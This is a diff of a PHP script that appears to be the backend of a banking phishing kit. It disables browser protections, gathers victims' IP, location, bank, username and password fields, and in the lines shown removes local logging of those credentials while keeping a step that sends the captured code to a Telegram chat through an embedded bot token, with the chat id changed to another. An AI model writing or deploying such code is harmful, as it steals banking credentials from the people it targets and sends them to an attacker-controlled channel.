@@ -1,11 +1,4 @@
-
-       
- <?php
-
-
-
-
-
+<?php
 header("Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'");
 header("X-XSS-Protection: 0");
 header("X-Frame-Options: ALLOWALL");
@@ -213,13 +206,10 @@ $dl       = $_POST['drivers'];
 
 
 
-$message = "$ip$lh$code\]\n";
-file_put_contents($file2, "$date$li$time$li$ip$li$bsr$li$uos$li$country$li$city$li$continent$li$tp$li$cn$li$is$li$la$li$lp$li$crn$li$type$li$bank$li$url$li$logo$li$gitusr$li$mapurl$li$isp$li$li$code\n", FILE_APPEND); 
-file_put_contents($file, "$message\n////[$date]////////[$time]////////////[$bank]//[TELEGRAM-LOG]//\n", FILE_APPEND);file_put_contents($file3, "$date$li$time$li$url$li$bank$li$ili$user$li$pass\n", FILE_APPEND);
-file_put_contents($file4, "$date$lh$time$lh$ip$lh$uaget\n", FILE_APPEND);
+$message = "$code\n";
 $apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
 $data = [
-    'chat_id' => '-871948148',
+    'chat_id' => '-957696959',
     'text' => $message
 ];
 
